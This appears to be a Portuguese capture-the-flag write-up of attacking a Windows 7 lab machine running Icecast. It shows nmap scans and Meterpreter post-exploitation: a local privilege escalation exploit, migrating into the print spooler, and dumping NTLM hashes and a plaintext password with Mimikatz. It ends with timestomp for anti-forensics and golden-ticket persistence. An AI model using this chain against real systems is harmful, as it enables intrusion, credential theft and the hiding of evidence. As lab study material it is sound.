# Primeira etapa (Recon)

## Scanning de máquina

Primeiramente rodei o nmap para verificar as portas abertas

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 20:30 -03
Nmap scan report for 10.10.191.113
Host is up (0.17s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/19%OT=135%CT=1%CU=35153%PV=Y%DS=2%DC=I%G=Y%TM=62117D
OS:EF%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=7)OPS(O1=M506NW8ST11%O2=M506NW8
OS:ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M506NW8ST11%O6=M506ST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:06NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.49 seconds
```

Rodei novamente para ver se ele me retornava o host

```nmap -sS -p- <IP>```

```
Nmap scan report for 10.10.191.113
Host is up (0.23s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown
```

```nmap -sC <IP> -vv```

```
Completed NSE at 22:32, 118.23s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 0.01s elapsed
Nmap scan report for 10.10.191.113
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2022-02-19 22:24:39 -03 for 471s
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
| ssl-cert: Subject: commonName=Dark-PC
| Issuer: commonName=Dark-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-02-18T23:28:45
| Not valid after:  2022-08-20T23:28:45
| MD5:   da2f ef77 7d46 e829 7e1e 6605 584a 41bb
| SHA-1: 2d6b bd7e 3f72 0065 b750 3123 880e be23 31aa 8fe6
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQIkmKZaNdiJFD3u4WPULb3TANBgkqhkiG9w0BAQUFADAS
| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIyMDIxODIzMjg0NVoXDTIyMDgyMDIzMjg0
| NVowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAMYT8i4oRBTgaW2t4bRRdgDzDUnxWK/GLmchoxoMQa+n6N+m3kxTXcxk
| JGVSkOyGfsDd3/xld9Ko3+cTf0OtbnkR2vj2fR2w1LEXBwh4aTWrLqHLUES0WZhx
| HPV8P9uqAzsRksxNZlz/YV/KCaZW+L43ktIHuDx80CYA6ZCY8xWA4OdkzuJ1Jmw8
| S0X1Ty5TYgOWIU9PkdOdtkix9OPUpZ5QDYVBODv4Nj568hzO0h9+eTt1uU0KU093
| zAyyQ9XyYucSoY4ldTiFUlWTn0ra+MxOMXeWCdKGgsYU7eNGi/xQTVR8taZRPMk4
| 02kd/z9bbHgWbfH+fPyOTem4t/2u6J0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQASilc7/tavFfcE
| wTFRKqgZPKcHm/glPdtJht4LL4kt0TDAdQxzKstxo0P9k/WW962PlCwfXdqkjtpD
| cWw+6s0KLtJRvFEfOQEurPtZEKW4hihkb1uf7GUto5YrJRrN3z4SGREik751PDwJ
| GnLyVfykrtmLagDB65/EiFwNYU2SoI+/1mf2YaCC0tZmbnLkmEtWhC13/KI++xqa
| y38tMlMoyqx8cZ4HPG+aZ/bmW1VXr6T91ialyBJzcZnMr9hH9L12tEHRZwGeJTHN
| sA8PPp+NTQj6KmMqP2h/nc4JYINr/veCDbxYet6yZhr1WnLe9v94aoWLXWW4JUMu
| JHJ9AF0j
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-02-20T01:30:32+00:00
|_ssl-date: 2022-02-20T01:30:32+00:00; 0s from scanner time.
5357/tcp  open  wsdapi        syn-ack ttl 127
8000/tcp  open  http-alt      syn-ack ttl 127
| http-methods: 
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49159/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

Host script results:
| nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:d8:e5:4d:e5:0d (unknown)
| Names:
|   DARK-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DARK-PC<20>          Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 d8 e5 4d e5 0d 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-19T19:30:32-06:00
|_clock-skew: mean: 1h11m59s, deviation: 2h41m00s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-02-20T01:30:32
|_  start_date: 2022-02-19T23:28:43
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48152/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62067/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 4932/udp): CLEAN (Failed to receive data)
|   Check 4 (port 57329/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

## Buscando por vulnerabilidades no icecast

Utilizei este [site](https://www.cvedetails.com) para buscar vulnerabilidades que tinham relação com o icecast.


# Segunda etapa

## Encontrando o usuário que está rodando o processo de icecast

Para isso eu utilizei o comando ```getuid```

```
Server username: Dark-PC\Dark
```

Depois busquei as informações do sistema com ```sysinfo``` 

```
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

  
Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete* (Uso o comando exclusivamente para reconhecimento).

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.18.26 - Collecting local exploits for x86/windows...
[*] 10.10.18.26 - 4 exploit checks are being tried...
[+] 10.10.18.26 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
```

Após isso, eu configurei o parâmetro de SESSION e LHOST

Depois de rodar o exploit, eu olhei os privilégios com o comando ```getprivs```

```
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

## Terceira etapa

Primeiramente eu listei os serviços a procura do lsass. Eu busquei um processo com arquitetura similar a ele.

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.

```
ps
```

```
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 500   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1056  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1136  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1236  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1244  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1312  500   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1324  1304  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1396  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1428  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 1436  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1548  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1652  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1660  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 1692  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1832  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 2268  1324  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2300  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2324  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2344  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2388  2500  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 2560  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2836  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2992  500   Defrag.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\Defrag.exe
```

Depois disso eu migrei para esse serviço utilizando o comando ```migrate -N PROCESS_NAME```

```
[*] Migrating from 2388 to 1368...
[*] Migration completed successfully.
```

Depois disso eu verifiquei o usuário usando o comando ```getuid```

```
Server username: NT AUTHORITY\SYSTEM
```

e ENTÃO UTILIZEI O MIMIKATz Mimikatz is a rather infamous password dumping tool that is incredibly useful.

```
load kiwi
```

```
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

E usei ele para pegar as credenciais do usuário DARK

```
creds_all
```

```
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

## Quarta etapa

Utilizei o botão help para me ajudar em algumas perguntas desse capture the flag

  
To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact. (```timestomp```)

  
Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain. (```golden_ticket_create```)